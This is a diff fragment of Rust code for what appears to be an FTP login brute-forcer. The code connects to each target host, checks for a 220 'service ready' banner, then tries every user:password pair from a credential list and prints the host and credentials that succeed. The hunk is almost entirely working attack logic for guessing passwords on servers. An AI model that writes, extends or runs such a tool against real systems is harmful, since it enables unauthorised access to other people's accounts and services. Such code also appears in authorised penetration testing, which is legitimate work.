@@ -34,20 +34,25 @@ fn main() -> std::io::Result<()> {
     for addr in &mut addresses {
         let mut stream = TcpStream::connect(addr.get_host())?;
         let mut buffer = [0; MAX_MESSAGE_SIZE];
-        // read welcome message
         stream.read(&mut buffer)?;
-        for passwd in &credential_list {
-            let iter: Vec<&str> = passwd.split(':').collect();
-            addr.attempt(iter[0], iter[1], &mut stream)?;
-            if addr.is_successful(){
-                println!(
-                    "Success on {:?} with credentials {:?}. Total attempts: {:?}",
-                    addr.get_host(),
-                    addr.get_successful_credentials().unwrap(),
-                    addr.attempts()
-                );
-                break;
+        // read welcome message and make sure the code is 220 (Service ready for new user)
+        // TODO retry later if not.
+        if buffer[..3] == [50, 50, 48]  {
+            for passwd in &credential_list {
+                let iter: Vec<&str> = passwd.split(':').collect();
+                addr.attempt(iter[0], iter[1], &mut stream)?;
+                if addr.is_successful(){
+                    println!(
+                        "Success on {:?} with credentials {:?}. Total attempts: {:?}",
+                        addr.get_host(),
+                        addr.get_successful_credentials().unwrap(),
+                        addr.attempts()
+                    );
+                    break;
+                }
             }
+        } else {
+            println!("It appears that {:?} is not ready for new connections", addr.get_host());
         }
     }
     Ok(())
